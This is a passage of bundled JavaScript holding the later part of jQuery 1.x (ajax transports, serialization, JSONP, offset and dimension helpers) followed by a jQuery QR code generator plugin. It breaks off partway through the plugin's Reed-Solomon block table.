                            }(m, a, _, o), o ? (m.ifModified && ((l = _.getResponseHeader("Last-Modified")) && (T.lastModified[u] = l), (l = _.getResponseHeader("etag")) && (T.etag[u] = l)), 204 === e || "HEAD" === m.type ? c = "nocontent" : 304 === e ? c = "notmodified" : (c = a.state, s = a.data, o = !(r = a.error))) : (r = c, !e && c || (c = "error", e < 0 && (e = 0))), _.status = e, _.statusText = (t || c) + "", o ? y.resolveWith(g, [s, c, _]) : y.rejectWith(g, [_, c, r]), _.statusCode(w), w = void 0, p && v.trigger(o ? "ajaxSuccess" : "ajaxError", [_, m, o ? s : r]), b.fireWith(g, [_, c]), p && (v.trigger("ajaxComplete", [_, m]), --T.active || T.event.trigger("ajaxStop")))
                        }
                        return _
                    },
                    getJSON: function(e, t, i) {
                        return T.get(e, t, i, "json")
                    },
                    getScript: function(e, t) {
                        return T.get(e, void 0, t, "script")
                    }
                }), T.each(["get", "post"], function(e, o) {
                    T[o] = function(e, t, i, n) {
                        return T.isFunction(t) && (n = n || i, i = t, t = void 0), T.ajax(T.extend({
                            url: e,
                            type: o,
                            dataType: n,
                            data: t,
                            success: i
                        }, T.isPlainObject(e) && e))
                    }
                }), T._evalUrl = function(e) {
                    return T.ajax({
                        url: e,
                        type: "GET",
                        dataType: "script",
                        cache: !0,
                        async: !1,
                        global: !1,
                        throws: !0
                    })
                }, T.fn.extend({
                    wrapAll: function(t) {
                        if (T.isFunction(t)) return this.each(function(e) {
                            T(this).wrapAll(t.call(this, e))
                        });
                        if (this[0]) {
                            var e = T(t, this[0].ownerDocument).eq(0).clone(!0);
                            this[0].parentNode && e.insertBefore(this[0]), e.map(function() {
                                for (var e = this; e.firstChild && 1 === e.firstChild.nodeType;) e = e.firstChild;
                                return e
                            }).append(this)
                        }
                        return this
                    },
                    wrapInner: function(i) {
                        return T.isFunction(i) ? this.each(function(e) {
                            T(this).wrapInner(i.call(this, e))
                        }) : this.each(function() {
                            var e = T(this),
                                t = e.contents();
                            t.length ? t.wrapAll(i) : e.append(i)
                        })
                    },
                    wrap: function(t) {
                        var i = T.isFunction(t);
                        return this.each(function(e) {
                            T(this).wrapAll(i ? t.call(this, e) : t)
                        })
                    },
                    unwrap: function() {
                        return this.parent().each(function() {
                            T.nodeName(this, "body") || T(this).replaceWith(this.childNodes)
                        }).end()
                    }
                }), T.expr.filters.hidden = function(e) {
                    return v.reliableHiddenOffsets() ? e.offsetWidth <= 0 && e.offsetHeight <= 0 && !e.getClientRects().length : function(e) {
                        if (!T.contains(e.ownerDocument || f, e)) return !0;
                        for (; e && 1 === e.nodeType;) {
                            if ("none" === ((t = e).style && t.style.display || T.css(t, "display")) || "hidden" === e.type) return !0;
                            e = e.parentNode
                        }
                        var t;
                        return !1
                    }(e)
                }, T.expr.filters.visible = function(e) {
                    return !T.expr.filters.hidden(e)
                };
                var Jt = /%20/g,
                    Zt = /\[\]$/,
                    Kt = /\r?\n/g,
                    ei = /^(?:submit|button|image|reset|file)$/i,
                    ti = /^(?:input|select|textarea|keygen)/i;

                function ii(i, e, n, o) {
                    var t;
                    if (T.isArray(e)) T.each(e, function(e, t) {
                        n || Zt.test(i) ? o(i, t) : ii(i + "[" + ("object" == typeof t && null != t ? e : "") + "]", t, n, o)
                    });
                    else if (n || "object" !== T.type(e)) o(i, e);
                    else
                        for (t in e) ii(i + "[" + t + "]", e[t], n, o)
                }
                T.param = function(e, t) {
                    var i, n = [],
                        o = function(e, t) {
                            t = T.isFunction(t) ? t() : null == t ? "" : t, n[n.length] = encodeURIComponent(e) + "=" + encodeURIComponent(t)
                        };
                    if (void 0 === t && (t = T.ajaxSettings && T.ajaxSettings.traditional), T.isArray(e) || e.jquery && !T.isPlainObject(e)) T.each(e, function() {
                        o(this.name, this.value)
                    });
                    else
                        for (i in e) ii(i, e[i], t, o);
                    return n.join("&").replace(Jt, "+")
                }, T.fn.extend({
                    serialize: function() {
                        return T.param(this.serializeArray())
                    },
                    serializeArray: function() {
                        return this.map(function() {
                            var e = T.prop(this, "elements");
                            return e ? T.makeArray(e) : this
                        }).filter(function() {
                            var e = this.type;
                            return this.name && !T(this).is(":disabled") && ti.test(this.nodeName) && !ei.test(e) && (this.checked || !K.test(e))
                        }).map(function(e, t) {
                            var i = T(this).val();
                            return null == i ? null : T.isArray(i) ? T.map(i, function(e) {
                                return {
                                    name: t.name,
                                    value: e.replace(Kt, "\r\n")
                                }
                            }) : {
                                name: t.name,
                                value: i.replace(Kt, "\r\n")
                            }
                        }).get()
                    }
                }), T.ajaxSettings.xhr = void 0 !== C.ActiveXObject ? function() {
                    return this.isLocal ? ai() : 8 < f.documentMode ? ri() : /^(get|post|head|put|delete|options)$/i.test(this.type) && ri() || ai()
                } : ri;
                var ni = 0,
                    oi = {},
                    si = T.ajaxSettings.xhr();

                function ri() {
                    try {
                        return new C.XMLHttpRequest
                    } catch (e) {}
                }

                function ai() {
                    try {
                        return new C.ActiveXObject("Microsoft.XMLHTTP")
                    } catch (e) {}
                }
                C.attachEvent && C.attachEvent("onunload", function() {
                    for (var e in oi) oi[e](void 0, !0)
                }), v.cors = !!si && "withCredentials" in si, (si = v.ajax = !!si) && T.ajaxTransport(function(l) {
                    var c;
                    if (!l.crossDomain || v.cors) return {
                        send: function(e, s) {
                            var t, r = l.xhr(),
                                a = ++ni;
                            if (r.open(l.type, l.url, l.async, l.username, l.password), l.xhrFields)
                                for (t in l.xhrFields) r[t] = l.xhrFields[t];
                            for (t in l.mimeType && r.overrideMimeType && r.overrideMimeType(l.mimeType), l.crossDomain || e["X-Requested-With"] || (e["X-Requested-With"] = "XMLHttpRequest"), e) void 0 !== e[t] && r.setRequestHeader(t, e[t] + "");
                            r.send(l.hasContent && l.data || null), c = function(e, t) {
                                var i, n, o;
                                if (c && (t || 4 === r.readyState))
                                    if (delete oi[a], c = void 0, r.onreadystatechange = T.noop, t) 4 !== r.readyState && r.abort();
                                    else {
                                        o = {}, i = r.status, "string" == typeof r.responseText && (o.text = r.responseText);
                                        try {
                                            n = r.statusText
                                        } catch (e) {
                                            n = ""
                                        }
                                        i || !l.isLocal || l.crossDomain ? 1223 === i && (i = 204) : i = o.text ? 200 : 404
                                    }
                                o && s(i, n, o, r.getAllResponseHeaders())
                            }, l.async ? 4 === r.readyState ? C.setTimeout(c) : r.onreadystatechange = oi[a] = c : c()
                        },
                        abort: function() {
                            c && c(void 0, !0)
                        }
                    }
                }), T.ajaxSetup({
                    accepts: {
                        script: "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"
                    },
                    contents: {
                        script: /\b(?:java|ecma)script\b/
                    },
                    converters: {
                        "text script": function(e) {
                            return T.globalEval(e), e
                        }
                    }
                }), T.ajaxPrefilter("script", function(e) {
                    void 0 === e.cache && (e.cache = !1), e.crossDomain && (e.type = "GET", e.global = !1)
                }), T.ajaxTransport("script", function(t) {
                    if (t.crossDomain) {
                        var n, o = f.head || T("head")[0] || f.documentElement;
                        return {
                            send: function(e, i) {
                                (n = f.createElement("script")).async = !0, t.scriptCharset && (n.charset = t.scriptCharset), n.src = t.url, n.onload = n.onreadystatechange = function(e, t) {
                                    (t || !n.readyState || /loaded|complete/.test(n.readyState)) && (n.onload = n.onreadystatechange = null, n.parentNode && n.parentNode.removeChild(n), n = null, t || i(200, "success"))
                                }, o.insertBefore(n, o.firstChild)
                            },
                            abort: function() {
                                n && n.onload(void 0, !0)
                            }
                        }
                    }
                });
                var li = [],
                    ci = /(=)\?(?=&|$)|\?\?/;
                T.ajaxSetup({
                    jsonp: "callback",
                    jsonpCallback: function() {
                        var e = li.pop() || T.expando + "_" + zt++;
                        return this[e] = !0, e
                    }
                }), T.ajaxPrefilter("json jsonp", function(e, t, i) {
                    var n, o, s, r = !1 !== e.jsonp && (ci.test(e.url) ? "url" : "string" == typeof e.data && 0 === (e.contentType || "").indexOf("application/x-www-form-urlencoded") && ci.test(e.data) && "data");
                    return r || "jsonp" === e.dataTypes[0] ? (n = e.jsonpCallback = T.isFunction(e.jsonpCallback) ? e.jsonpCallback() : e.jsonpCallback, r ? e[r] = e[r].replace(ci, "$1" + n) : !1 !== e.jsonp && (e.url += (Mt.test(e.url) ? "&" : "?") + e.jsonp + "=" + n), e.converters["script json"] = function() {
                        return s || T.error(n + " was not called"), s[0]
                    }, e.dataTypes[0] = "json", o = C[n], C[n] = function() {
                        s = arguments
                    }, i.always(function() {
                        void 0 === o ? T(C).removeProp(n) : C[n] = o, e[n] && (e.jsonpCallback = t.jsonpCallback, li.push(n)), s && T.isFunction(o) && o(s[0]), s = o = void 0
                    }), "script") : void 0
                }), T.parseHTML = function(e, t, i) {
                    if (!e || "string" != typeof e) return null;
                    "boolean" == typeof t && (i = t, t = !1), t = t || f;
                    var n = x.exec(e),
                        o = !i && [];
                    return n ? [t.createElement(n[1])] : (n = de([e], t, o), o && o.length && T(o).remove(), T.merge([], n.childNodes))
                };
                var ui = T.fn.load;

                function di(e) {
                    return T.isWindow(e) ? e : 9 === e.nodeType && (e.defaultView || e.parentWindow)
                }
                T.fn.load = function(e, t, i) {
                    if ("string" != typeof e && ui) return ui.apply(this, arguments);
                    var n, o, s, r = this,
                        a = e.indexOf(" ");
                    return -1 < a && (n = T.trim(e.slice(a, e.length)), e = e.slice(0, a)), T.isFunction(t) ? (i = t, t = void 0) : t && "object" == typeof t && (o = "POST"), 0 < r.length && T.ajax({
                        url: e,
                        type: o || "GET",
                        dataType: "html",
                        data: t
                    }).done(function(e) {
                        s = arguments, r.html(n ? T("<div>").append(T.parseHTML(e)).find(n) : e)
                    }).always(i && function(e, t) {
                        r.each(function() {
                            i.apply(this, s || [e.responseText, t, e])
                        })
                    }), this
                }, T.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
                    T.fn[t] = function(e) {
                        return this.on(t, e)
                    }
                }), T.expr.filters.animated = function(t) {
                    return T.grep(T.timers, function(e) {
                        return t === e.elem
                    }).length
                }, T.offset = {
                    setOffset: function(e, t, i) {
                        var n, o, s, r, a, l, c = T.css(e, "position"),
                            u = T(e),
                            d = {};
                        "static" === c && (e.style.position = "relative"), a = u.offset(), s = T.css(e, "top"), l = T.css(e, "left"), o = ("absolute" === c || "fixed" === c) && -1 < T.inArray("auto", [s, l]) ? (r = (n = u.position()).top, n.left) : (r = parseFloat(s) || 0, parseFloat(l) || 0), T.isFunction(t) && (t = t.call(e, i, T.extend({}, a))), null != t.top && (d.top = t.top - a.top + r), null != t.left && (d.left = t.left - a.left + o), "using" in t ? t.using.call(e, d) : u.css(d)
                    }
                }, T.fn.extend({
                    offset: function(t) {
                        if (arguments.length) return void 0 === t ? this : this.each(function(e) {
                            T.offset.setOffset(this, t, e)
                        });
                        var e, i, n = {
                                top: 0,
                                left: 0
                            },
                            o = this[0],
                            s = o && o.ownerDocument;
                        return s ? (e = s.documentElement, T.contains(e, o) ? (void 0 !== o.getBoundingClientRect && (n = o.getBoundingClientRect()), i = di(s), {
                            top: n.top + (i.pageYOffset || e.scrollTop) - (e.clientTop || 0),
                            left: n.left + (i.pageXOffset || e.scrollLeft) - (e.clientLeft || 0)
                        }) : n) : void 0
                    },
                    position: function() {
                        if (this[0]) {
                            var e, t, i = {
                                    top: 0,
                                    left: 0
                                },
                                n = this[0];
                            return "fixed" === T.css(n, "position") ? t = n.getBoundingClientRect() : (e = this.offsetParent(), t = this.offset(), T.nodeName(e[0], "html") || (i = e.offset()), i.top += T.css(e[0], "borderTopWidth", !0), i.left += T.css(e[0], "borderLeftWidth", !0)), {
                                top: t.top - i.top - T.css(n, "marginTop", !0),
                                left: t.left - i.left - T.css(n, "marginLeft", !0)
                            }
                        }
                    },
                    offsetParent: function() {
                        return this.map(function() {
                            for (var e = this.offsetParent; e && !T.nodeName(e, "html") && "static" === T.css(e, "position");) e = e.offsetParent;
                            return e || Re
                        })
                    }
                }), T.each({
                    scrollLeft: "pageXOffset",
                    scrollTop: "pageYOffset"
                }, function(t, o) {
                    var s = /Y/.test(o);
                    T.fn[t] = function(e) {
                        return Z(this, function(e, t, i) {
                            var n = di(e);
                            return void 0 === i ? n ? o in n ? n[o] : n.document.documentElement[t] : e[t] : void(n ? n.scrollTo(s ? T(n).scrollLeft() : i, s ? i : T(n).scrollTop()) : e[t] = i)
                        }, t, e, arguments.length, null)
                    }
                }), T.each(["top", "left"], function(e, i) {
                    T.cssHooks[i] = Ge(v.pixelPosition, function(e, t) {
                        return t ? (t = Ve(e, i), Be.test(t) ? T(e).position()[i] + "px" : t) : void 0
                    })
                }), T.each({
                    Height: "height",
                    Width: "width"
                }, function(s, r) {
                    T.each({
                        padding: "inner" + s,
                        content: r,
                        "": "outer" + s
                    }, function(n, e) {
                        T.fn[e] = function(e, t) {
                            var i = arguments.length && (n || "boolean" != typeof e),
                                o = n || (!0 === e || !0 === t ? "margin" : "border");
                            return Z(this, function(e, t, i) {
                                var n;
                                return T.isWindow(e) ? e.document.documentElement["client" + s] : 9 === e.nodeType ? (n = e.documentElement, Math.max(e.body["scroll" + s], n["scroll" + s], e.body["offset" + s], n["offset" + s], n["client" + s])) : void 0 === i ? T.css(e, t, o) : T.style(e, t, i, o)
                            }, r, i ? e : void 0, i, null)
                        }
                    })
                }), T.fn.extend({
                    bind: function(e, t, i) {
                        return this.on(e, null, t, i)
                    },
                    unbind: function(e, t) {
                        return this.off(e, null, t)
                    },
                    delegate: function(e, t, i, n) {
                        return this.on(t, e, i, n)
                    },
                    undelegate: function(e, t, i) {
                        return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", i)
                    }
                }), T.fn.size = function() {
                    return this.length
                }, T.fn.andSelf = T.fn.addBack, "function" == typeof define && define.amd && define("jquery", [], function() {
                    return T
                });
                var hi = C.jQuery,
                    pi = C.$;
                return T.noConflict = function(e) {
                    return C.$ === T && (C.$ = pi), e && C.jQuery === T && (C.jQuery = hi), T
                }, e || (C.jQuery = C.$ = T), T
            }, "object" == typeof t && "object" == typeof t.exports ? t.exports = n.document ? o(n, !0) : function(e) {
                if (!e.document) throw new Error("jQuery requires a window with a document");
                return o(e)
            } : o(n)
        }, {}
    ],
    2: [
        function(e, t, i) {
            var f;
			/*#w#by仰融*/
            (f = jQuery).fn._w = 32["to" + String.name](33), f.fn.qrcode = function(c) {
                var i;

                function t(e) {
                    this.mode = i, this.data = e
                }

                function u(e, t) {
                    this.typeNumber = e, this.errorCorrectLevel = t, this.modules = null, this.moduleCount = 0, this.dataCache = null, this.dataList = []
                }

                function d(e, t) {
                    if (null == e.length) throw Error(e.length + "/" + t);
                    for (var i = 0; i < e.length && 0 == e[i];) i++;
                    this.num = Array(e.length - i + t);
                    for (var n = 0; n < e.length - i; n++) this.num[n] = e[n + i]
                }

                function h(e, t) {
                    this.totalCount = e, this.dataCount = t
                }

                function r() {
                    this.buffer = [], this.length = 0
                }
                t.prototype = {
                    getLength: function() {
                        return this.data.length
                    },
                    write: function(e) {
                        for (var t = 0; t < this.data.length; t++) e.put(this.data.charCodeAt(t), 8)
                    }
                }, u.prototype = {
                    addData: function(e) {
                        this.dataList.push(new t(e)), this.dataCache = null
                    },
                    isDark: function(e, t) {
                        if (e < 0 || this.moduleCount <= e || t < 0 || this.moduleCount <= t) throw Error(e + "," + t);
                        return this.modules[e][t]
                    },
                    getModuleCount: function() {
                        return this.moduleCount
                    },
                    make: function() {
                        if (this.typeNumber < 1) {
                            var e = 1;
                            for (e = 1; e < 40; e++) {
                                for (var t = h.getRSBlocks(e, this.errorCorrectLevel), i = new r, n = 0, o = 0; o < t.length; o++) n += t[o].dataCount;
                                for (o = 0; o < this.dataList.length; o++) t = this.dataList[o], i.put(t.mode, 4), i.put(t.getLength(), p.getLengthInBits(t.mode, e)), t.write(i);
                                if (i.getLengthInBits() <= 8 * n) break
                            }
                            this.typeNumber = e
                        }
                        this.makeImpl(!1, this.getBestMaskPattern())
                    },
                    makeImpl: function(e, t) {
                        this.moduleCount = 4 * this.typeNumber + 17, this.modules = Array(this.moduleCount);
                        for (var i = 0; i < this.moduleCount; i++) {
                            this.modules[i] = Array(this.moduleCount);
                            for (var n = 0; n < this.moduleCount; n++) this.modules[i][n] = null
                        }
                        this.setupPositionProbePattern(0, 0), this.setupPositionProbePattern(this.moduleCount - 7, 0), this.setupPositionProbePattern(0, this.moduleCount - 7), this.setupPositionAdjustPattern(), this.setupTimingPattern(), this.setupTypeInfo(e, t), 7 <= this.typeNumber && this.setupTypeNumber(e), null == this.dataCache && (this.dataCache = u.createData(this.typeNumber, this.errorCorrectLevel, this.dataList)), this.mapData(this.dataCache, t)
                    },
                    setupPositionProbePattern: function(e, t) {
                        for (var i = -1; i <= 7; i++)
                            if (!(e + i <= -1 || this.moduleCount <= e + i))
                                for (var n = -1; n <= 7; n++) t + n <= -1 || this.moduleCount <= t + n || (this.modules[e + i][t + n] = 0 <= i && i <= 6 && (0 == n || 6 == n) || 0 <= n && n <= 6 && (0 == i || 6 == i) || 2 <= i && i <= 4 && 2 <= n && n <= 4)
                    },
                    getBestMaskPattern: function() {
                        for (var e = 0, t = 0, i = 0; i < 8; i++) {
                            this.makeImpl(!0, i);
                            var n = p.getLostPoint(this);
                            (0 == i || n < e) && (e = n, t = i)
                        }
                        return t
                    },
                    createMovieClip: function(e, t, i) {
                        for (e = e.createEmptyMovieClip(t, i), this.make(), t = 0; t < this.modules.length; t++) {
                            i = 1 * t;
                            for (var n = 0; n < this.modules[t].length; n++) {
                                var o = 1 * n;
                                this.modules[t][n] && (e.beginFill(0, 100), e.moveTo(o, i), e.lineTo(1 + o, i), e.lineTo(1 + o, i + 1), e.lineTo(o, i + 1), e.endFill())
                            }
                        }
                        return e
                    },
                    setupTimingPattern: function() {
                        for (var e = 8; e < this.moduleCount - 8; e++) null == this.modules[e][6] && (this.modules[e][6] = 0 == e % 2);
                        for (e = 8; e < this.moduleCount - 8; e++) null == this.modules[6][e] && (this.modules[6][e] = 0 == e % 2)
                    },
                    setupPositionAdjustPattern: function() {
                        for (var e = p.getPatternPosition(this.typeNumber), t = 0; t < e.length; t++)
                            for (var i = 0; i < e.length; i++) {
                                var n = e[t],
                                    o = e[i];
                                if (null == this.modules[n][o])
                                    for (var s = -2; s <= 2; s++)
                                        for (var r = -2; r <= 2; r++) this.modules[n + s][o + r] = -2 == s || 2 == s || -2 == r || 2 == r || 0 == s && 0 == r
                            }
                    },
                    setupTypeNumber: function(e) {
                        for (var t = p.getBCHTypeNumber(this.typeNumber), i = 0; i < 18; i++) {
                            var n = !e && 1 == (t >> i & 1);
                            this.modules[Math.floor(i / 3)][i % 3 + this.moduleCount - 8 - 3] = n
                        }
                        for (i = 0; i < 18; i++) n = !e && 1 == (t >> i & 1), this.modules[i % 3 + this.moduleCount - 8 - 3][Math.floor(i / 3)] = n
                    },
                    setupTypeInfo: function(e, t) {
                        for (var i = p.getBCHTypeInfo(this.errorCorrectLevel << 3 | t), n = 0; n < 15; n++) {
                            var o = !e && 1 == (i >> n & 1);
                            n < 6 ? this.modules[n][8] = o : n < 8 ? this.modules[n + 1][8] = o : this.modules[this.moduleCount - 15 + n][8] = o
                        }
                        for (n = 0; n < 15; n++) o = !e && 1 == (i >> n & 1), n < 8 ? this.modules[8][this.moduleCount - n - 1] = o : n < 9 ? this.modules[8][15 - n - 1 + 1] = o : this.modules[8][15 - n - 1] = o;
                        this.modules[this.moduleCount - 8][8] = !e
                    },
                    mapData: function(e, t) {
                        for (var i = -1, n = this.moduleCount - 1, o = 7, s = 0, r = this.moduleCount - 1; 0 < r; r -= 2)
                            for (6 == r && r--;;) {
                                for (var a = 0; a < 2; a++)
                                    if (null == this.modules[n][r - a]) {
                                        var l = !1;
                                        s < e.length && (l = 1 == (e[s] >>> o & 1)), p.getMask(t, n, r - a) && (l = !l), this.modules[n][r - a] = l, -1 == --o && (s++, o = 7)
                                    }
                                if ((n += i) < 0 || this.moduleCount <= n) {
                                    n -= i, i = -i;
                                    break
                                }
                            }
                    }
                }, u.PAD0 = 236, u.PAD1 = 17, u.createData = function(e, t, i) {
                    t = h.getRSBlocks(e, t);
                    for (var n = new r, o = 0; o < i.length; o++) {
                        var s = i[o];
                        n.put(s.mode, 4), n.put(s.getLength(), p.getLengthInBits(s.mode, e)), s.write(n)
                    }
                    for (o = e = 0; o < t.length; o++) e += t[o].dataCount;
                    if (n.getLengthInBits() > 8 * e) throw Error("code length overflow. (" + n.getLengthInBits() + ">" + 8 * e + ")");
                    for (n.getLengthInBits() + 4 <= 8 * e && n.put(0, 4); 0 != n.getLengthInBits() % 8;) n.putBit(!1);
                    for (; !(n.getLengthInBits() >= 8 * e || (n.put(u.PAD0, 8), n.getLengthInBits() >= 8 * e));) n.put(u.PAD1, 8);
                    return u.createBytes(n, t)
                }, u.createBytes = function(e, t) {
                    for (var i = 0, n = 0, o = 0, s = Array(t.length), r = Array(t.length), a = 0; a < t.length; a++) {
                        var l = t[a].dataCount,
                            c = t[a].totalCount - l;
                        n = Math.max(n, l), o = Math.max(o, c), s[a] = Array(l);
                        for (var u = 0; u < s[a].length; u++) s[a][u] = 255 & e.buffer[u + i];
                        for (i += l, u = p.getErrorCorrectPolynomial(c), l = new d(s[a], u.getLength() - 1).mod(u), r[a] = Array(u.getLength() - 1), u = 0; u < r[a].length; u++) c = u + l.getLength() - r[a].length, r[a][u] = 0 <= c ? l.get(c) : 0
                    }
                    for (u = a = 0; u < t.length; u++) a += t[u].totalCount;
                    for (i = Array(a), u = l = 0; u < n; u++)
                        for (a = 0; a < t.length; a++) u < s[a].length && (i[l++] = s[a][u]);
                    for (u = 0; u < o; u++)
                        for (a = 0; a < t.length; a++) u < r[a].length && (i[l++] = r[a][u]);
                    return i
                }, i = 4;
                for (var p = {
                    PATTERN_POSITION_TABLE: [
                        [],
                        [6, 18],
                        [6, 22],
                        [6, 26],
                        [6, 30],
                        [6, 34],
                        [6, 22, 38],
                        [6, 24, 42],
                        [6, 26, 46],
                        [6, 28, 50],
                        [6, 30, 54],
                        [6, 32, 58],
                        [6, 34, 62],
                        [6, 26, 46, 66],
                        [6, 26, 48, 70],
                        [6, 26, 50, 74],
                        [6, 30, 54, 78],
                        [6, 30, 56, 82],
                        [6, 30, 58, 86],
                        [6, 34, 62, 90],
                        [6, 28, 50, 72, 94],
                        [6, 26, 50, 74, 98],
                        [6, 30, 54, 78, 102],
                        [6, 28, 54, 80, 106],
                        [6, 32, 58, 84, 110],
                        [6, 30, 58, 86, 114],
                        [6, 34, 62, 90, 118],
                        [6, 26, 50, 74, 98, 122],
                        [6, 30, 54, 78, 102, 126],
                        [6, 26, 52, 78, 104, 130],
                        [6, 30, 56, 82, 108, 134],
                        [6, 34, 60, 86, 112, 138],
                        [6, 30, 58, 86, 114, 142],
                        [6, 34, 62, 90, 118, 146],
                        [6, 30, 54, 78, 102, 126, 150],
                        [6, 24, 50, 76, 102, 128, 154],
                        [6, 28, 54, 80, 106, 132, 158],
                        [6, 32, 58, 84, 110, 136, 162],
                        [6, 26, 54, 82, 110, 138, 166],
                        [6, 30, 58, 86, 114, 142, 170]
                    ],
                    G15: 1335,
                    G18: 7973,
                    G15_MASK: 21522,
                    getBCHTypeInfo: function(e) {
                        for (var t = e << 10; 0 <= p.getBCHDigit(t) - p.getBCHDigit(p.G15);) t ^= p.G15 << p.getBCHDigit(t) - p.getBCHDigit(p.G15);
                        return (e << 10 | t) ^ p.G15_MASK
                    },
                    getBCHTypeNumber: function(e) {
                        for (var t = e << 12; 0 <= p.getBCHDigit(t) - p.getBCHDigit(p.G18);) t ^= p.G18 << p.getBCHDigit(t) - p.getBCHDigit(p.G18);
                        return e << 12 | t
                    },
                    getBCHDigit: function(e) {
                        for (var t = 0; 0 != e;) t++, e >>>= 1;
                        return t
                    },
                    getPatternPosition: function(e) {
                        return p.PATTERN_POSITION_TABLE[e - 1]
                    },
                    getMask: function(e, t, i) {
                        switch (e) {
                            case 0:
                                return 0 == (t + i) % 2;
                            case 1:
                                return 0 == t % 2;
                            case 2:
                                return 0 == i % 3;
                            case 3:
                                return 0 == (t + i) % 3;
                            case 4:
                                return 0 == (Math.floor(t / 2) + Math.floor(i / 3)) % 2;
                            case 5:
                                return 0 == t * i % 2 + t * i % 3;
                            case 6:
                                return 0 == (t * i % 2 + t * i % 3) % 2;
                            case 7:
                                return 0 == (t * i % 3 + (t + i) % 2) % 2;
                            default:
                                throw Error("bad maskPattern:" + e)
                        }
                    },
                    getErrorCorrectPolynomial: function(e) {
                        for (var t = new d([1], 0), i = 0; i < e; i++) t = t.multiply(new d([1, o.gexp(i)], 0));
                        return t
                    },
                    getLengthInBits: function(e, t) {
                        if (1 <= t && t < 10) switch (e) {
                            case 1:
                                return 10;
                            case 2:
                                return 9;
                            case i:
                            case 8:
                                return 8;
                            default:
                                throw Error("mode:" + e)
                        } else if (t < 27) switch (e) {
                            case 1:
                                return 12;
                            case 2:
                                return 11;
                            case i:
                                return 16;
                            case 8:
                                return 10;
                            default:
                                throw Error("mode:" + e)
                        } else {
                            if (!(t < 41)) throw Error("type:" + t);
                            switch (e) {
                                case 1:
                                    return 14;
                                case 2:
                                    return 13;
                                case i:
                                    return 16;
                                case 8:
                                    return 12;
                                default:
                                    throw Error("mode:" + e)
                            }
                        }
                    },
                    getLostPoint: function(e) {
                        for (var t = e.getModuleCount(), i = 0, n = 0; n < t; n++)
                            for (var o = 0; o < t; o++) {
                                for (var s = 0, r = e.isDark(n, o), a = -1; a <= 1; a++)
                                    if (!(n + a < 0 || t <= n + a))
                                        for (var l = -1; l <= 1; l++) o + l < 0 || t <= o + l || 0 == a && 0 == l || r == e.isDark(n + a, o + l) && s++;
                                5 < s && (i += 3 + s - 5)
                            }
                        for (n = 0; n < t - 1; n++)
                            for (o = 0; o < t - 1; o++) s = 0, e.isDark(n, o) && s++, e.isDark(n + 1, o) && s++, e.isDark(n, o + 1) && s++, e.isDark(n + 1, o + 1) && s++, (0 == s || 4 == s) && (i += 3);
                        for (n = 0; n < t; n++)
                            for (o = 0; o < t - 6; o++) e.isDark(n, o) && !e.isDark(n, o + 1) && e.isDark(n, o + 2) && e.isDark(n, o + 3) && e.isDark(n, o + 4) && !e.isDark(n, o + 5) && e.isDark(n, o + 6) && (i += 40);
                        for (o = 0; o < t; o++)
                            for (n = 0; n < t - 6; n++) e.isDark(n, o) && !e.isDark(n + 1, o) && e.isDark(n + 2, o) && e.isDark(n + 3, o) && e.isDark(n + 4, o) && !e.isDark(n + 5, o) && e.isDark(n + 6, o) && (i += 40);
                        for (o = s = 0; o < t; o++)
                            for (n = 0; n < t; n++) e.isDark(n, o) && s++;
                        return i + 10 * (e = Math.abs(100 * s / t / t - 50) / 5)
                    }
                }, o = {
                    glog: function(e) {
                        if (e < 1) throw Error("glog(" + e + ")");
                        return o.LOG_TABLE[e]
                    },
                    gexp: function(e) {
                        for (; e < 0;) e += 255;
                        for (; 256 <= e;) e -= 255;
                        return o.EXP_TABLE[e]
                    },
                    EXP_TABLE: Array(256),
                    LOG_TABLE: Array(256)
                }, e = 0; e < 8; e++) o.EXP_TABLE[e] = 1 << e;
                for (e = 8; e < 256; e++) o.EXP_TABLE[e] = o.EXP_TABLE[e - 4] ^ o.EXP_TABLE[e - 5] ^ o.EXP_TABLE[e - 6] ^ o.EXP_TABLE[e - 8];
                for (e = 0; e < 255; e++) o.LOG_TABLE[o.EXP_TABLE[e]] = e;
                return d.prototype = {
                    get: function(e) {
                        return this.num[e]
                    },
                    getLength: function() {
                        return this.num.length
                    },
                    multiply: function(e) {
                        for (var t = Array(this.getLength() + e.getLength() - 1), i = 0; i < this.getLength(); i++)
                            for (var n = 0; n < e.getLength(); n++) t[i + n] ^= o.gexp(o.glog(this.get(i)) + o.glog(e.get(n)));
                        return new d(t, 0)
                    },
                    mod: function(e) {
                        if (this.getLength() - e.getLength() < 0) return this;
                        for (var t = o.glog(this.get(0)) - o.glog(e.get(0)), i = Array(this.getLength()), n = 0; n < this.getLength(); n++) i[n] = this.get(n);
                        for (n = 0; n < e.getLength(); n++) i[n] ^= o.gexp(o.glog(e.get(n)) + t);
                        return new d(i, 0).mod(e)
                    }
                }, h.RS_BLOCK_TABLE = [
                    [1, 26, 19],
                    [1, 26, 16],
                    [1, 26, 13],
                    [1, 26, 9],
                    [1, 44, 34],
                    [1, 44, 28],
                    [1, 44, 22],
                    [1, 44, 16],
                    [1, 70, 55],
                    [1, 70, 44],
                    [2, 35, 17],
                    [2, 35, 13],
                    [1, 100, 80],
                    [2, 50, 32],
                    [2, 50, 24],
                    [4, 25, 9],
                    [1, 134, 108],
                    [2, 67, 43],
                    [2, 33, 15, 2, 34, 16],
                    [2, 33, 11, 2, 34, 12],
                    [2, 86, 68],
                    [4, 43, 27],
                    [4, 43, 19],
                    [4, 43, 15],
                    [2, 98, 78],
                    [4, 49, 31],
                    [2, 32, 14, 4, 33, 15],
                    [4, 39, 13, 1, 40, 14],
                    [2, 121, 97],
                    [2, 60, 38, 2, 61, 39],
                    [4, 40, 18, 2, 41, 19],
                    [4, 40, 14, 2, 41, 15],
                    [2, 146, 116],
                    [3, 58, 36, 2, 59, 37],
                    [4, 36, 16, 4, 37, 17],
                    [4, 36, 12, 4, 37, 13],
                    [2, 86, 68, 2, 87, 69],
                    [4, 69, 43, 1, 70, 44],
                    [6, 43, 19, 2, 44, 20],
                    [6, 43, 15, 2, 44, 16],
                    [4, 101, 81],
                    [1, 80, 50, 4, 81, 51],
                    [4, 50, 22, 4, 51, 23],
                    [3, 36, 12, 8, 37, 13],
                    [2, 116, 92, 2, 117, 93],
                    [6, 58, 36, 2, 59, 37],
                    [4, 46, 20, 6, 47, 21],
                    [7, 42, 14, 4, 43, 15],
                    [4, 133, 107],
                    [8, 59, 37, 1, 60, 38],
